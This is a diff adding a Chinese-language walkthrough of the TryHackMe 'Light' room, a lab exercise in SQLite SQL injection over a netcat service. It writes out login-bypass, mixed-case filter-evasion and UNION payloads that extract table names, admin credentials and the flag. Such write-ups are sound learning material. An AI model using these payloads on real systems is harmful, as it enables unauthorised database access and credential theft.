@@ -4,7 +4,157 @@
 
 ---
 
+这是我对 [Light](https://tryhackme.com/room/lightroom) 房间的write-up。
 
+# 概述
+
+这个房间是关于通过 Netcat 连接到 1337 端口并找到一些信息——管理员的用户名、密码和flag。我们还得到了一个起始用户名："……该应用运行在 1337 端口上。你可以使用 `nc machine_ip 1337` 连接到它。
+你可以使用用户名 **smokey** 来开始。"
+
+# 侦察
+
+这里有三个问题：
+
+1. **"管理员的用户名是什么？"**；
+
+2. **"问题 1 中提到的用户名的密码是什么？"**；
+
+3. **"flag 是什么？"**；
+
+获取到机器IP后，我们可以用 Netcat 连接到它：
+
+> Netcat（通常缩写为 nc）是一个多功能命令行实用程序，旨在使用 TCP 或 UDP 协议通过网络连接读取和写入数据。netcat 反向shell允许目标系统连接回攻击者的机器，通过发起出站连接来绕过入站防火墙限制。
+
+```
+nc machine_ip 1337
+```
+
+<img width="485" height="181" alt="image" src="https://github.com/user-attachments/assets/c44e0feb-ce50-4b03-bcc6-1d2d6376cefb" />
+
+我们看到一行（或表单）读取我们的输入并给出输出。如果你看到类似这样的东西（例如网站中的登录页面），你必须测试它是否是 SQL。
+
+> SQL 代表结构化查询语言，是一种标准化的编程语言，用于与关系数据库通信和操作。它允许用户创建、检索、更新和删除存储在由行和列组成的表中的数据。
+
+要测试它，你只需输入：`'`（单引号）并按 Enter。
+
+<img width="584" height="85" alt="image" src="https://github.com/user-attachments/assets/a99a1956-e16a-4644-b6c2-b597ea4defef" />
+
+错误输出 "Error: unrecognized token: "''' LIMIT 30" " 告诉我们这里可以使用 SQL 注入。但首先，它是什么以及它是如何工作的？
+
+# 漏洞利用
+
+SQL 注入是指攻击者在输入字段（如登录表单）中输入特殊字符，以改变背后的 SQL 查询。如果应用没有对输入进行清理，像 `'` 这样的东西会破坏查询，并表明输入被当作 SQL 代码读取，而不仅仅是纯文本。一旦你确认了这一点，你就可以添加像 `' OR 1=1 --` 这样的东西来绕过登录、从数据库中获取数据，甚至修改它。
+
+所以如果在登录表单中我在用户名字段输入"admin"，在密码字段输入"password123"，SQL 查询将看起来像这样：
+
+<img width="1307" height="59" alt="image" src="https://github.com/user-attachments/assets/dd6acb88-9ca6-4ed7-bbd0-bf763f38fcd0" />
+
+看看这个查询——`'admin'` 和 `'password123'` 被单引号 `'` 包裹。这些引号告诉数据库里面是一个值。但如果你在输入中输入 `'`，你就提前关闭了那个引号。现在它之后的所有内容都不再在字符串内，所以数据库把它当作实际的 SQL 代码读取。这就是整个技巧。你"逃逸"出字符串并开始编写你自己的查询。
+
+这是绕过登录最流行的 payload：`' OR '1'='1`
+
+所以查询将变成这样：
+
+```
+SELECT * FROM users WHERE username='' OR '1'='1' AND password='password123'
+```
+
+`'1'='1'` 永远为真，所以无论真实密码是什么，整个条件都变为真。数据库只会返回第一个用户（通常是 admin），你就进去了。
+
+或者你也可以输入类似：`' --`，因为 `--` 表示注释，所以查询中 `username=''` 之后的所有内容都会成为注释。
+
+<img width="1271" height="107" alt="image" src="https://github.com/user-attachments/assets/85edfc96-23f1-4f3a-9694-15996d9dccea" />
+
+它有针对 `--` 的过滤器，但没有针对 `' OR '1'='1` payload 的过滤器。我们得到了一个密码，但它没用。
+
+既然我们知道可以使用 SQLi（SQL 注入），现在我们需要从数据库中获取管理员的用户名和密码。我找到了一个非常有用的仓库，其中包含针对不同类型 SQL 的大量 payload：https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
+
+让我们找出我们到底是哪种 SQL。我们需要得到一些错误，然后从中推断出来。
+
+<img width="424" height="51" alt="image" src="https://github.com/user-attachments/assets/c19da94c-0ccb-4e48-8a33-ae1262794765" />
+
+在 Google 上搜索这个错误：
+
+<img width="891" height="426" alt="image" src="https://github.com/user-attachments/assets/6ece7292-c98a-4637-91ca-a500ee563640" />
+
+是 SQLite。现在我们可以使用那个仓库中的一些 payload：
+
+<img width="1128" height="568" alt="image" src="https://github.com/user-attachments/assets/1f05d951-875e-43b6-ab68-b9074b9eeac3" />
+
+我们需要"提取表名"。我将使用这个 payload：
+
+```
+SELECT tbl_name FROM sqlite_master WHERE type='table
+```
+
+<img width="1169" height="53" alt="image" src="https://github.com/user-attachments/assets/a478a967-9d52-4350-85f3-d4806bb7d251" />
+
+它有针对某些词（如 SELECT 或 FROM）的过滤器，我们可以通过改变单词的大小写来绕过它。
+
+<img width="1186" height="53" alt="image" src="https://github.com/user-attachments/assets/4c453590-e70a-47de-8e46-0e7a89a3497c" />
+
+我得到了一个错误。为什么？那么，让我们记住查询的结构：
+
+```
+SELECT * FROM users WHERE username='admin' AND password='password123'
+```
+
+所以当我们使用那个 payload 时，查询看起来像这样：
+
+```
+SELECT * FROM users WHERE username='' SeLect tbl_name FrOm sqlite_master WheRe type='table' AND password='password123'
+```
+
+我们想要运行我们自己的查询 `SELECT tbl_name FROM sqlite_master WHERE type='table'`。但你不能直接把它粘贴在原始查询后面，数据库会看到两个 SELECT 关键字背靠背并报错。
+
+`UNION` 是让我们运行第二个 SELECT 并将两个结果一起显示的词。所以最终查询变成：
+
+```
+SELECT * FROM users WHERE username='' AND password=''
+UNION
+SELECT tbl_name FROM sqlite_master WHERE type='table'
+```
+
+> 结构示例
+
+所以我运行了这个：
+
+```
+' UnIon SeLect tbl_name FrOm sqlite_master WheRe type='table
+```
+
+<img width="1258" height="54" alt="image" src="https://github.com/user-attachments/assets/100dde05-69de-4c65-98b9-7d293e69dcaf" />
+
+我们得到了表名。现在我们可以使用这个 payload 查看里面的内容：
+
+```
+SELECT sql FROM sqlite_master WHERE tbl_name='<TABLE_NAME>
+```
+
+<img width="1288" height="128" alt="image" src="https://github.com/user-attachments/assets/adfa0c37-c635-4b04-8bfa-9e11765a29ea" />
+
+我们得到了三个列：`id`、`username`、`password`。让我们使用这个 payload 检查它们：
+
+```
+' UNION SELECT username FROM 'admintable
+' UNION SELECT password FROM 'admintable
+```
+
+<img width="962" height="107" alt="image" src="https://github.com/user-attachments/assets/71b3e51e-e698-4e15-bbec-40eca294c1d4" />
+
+在 username 列中我们有管理员的用户名，在 password 列中我们有flag。让我们使用他的用户名搜索管理员的密码：
+
+```
+' UnIon SeLect password FroM 'admintable' WheRe username='(admins_username)
+```
+
+<img width="1409" height="55" alt="image" src="https://github.com/user-attachments/assets/1f35e210-1909-42c8-9d07-e3235bed7e69" />
+
+然后我们得到了管理员的密码。
+
+## 经验教训
+
+为了解出这个挑战，我不得不学习 SQL 注入的基础知识，所以这就是为什么我尝试在这里做一个简单的解释。使用 `'` 检查表单，看看它是否使用 SQL。实际上，SQLi 真的很有趣，我打算更深入地学习它。
 
 </details>
 
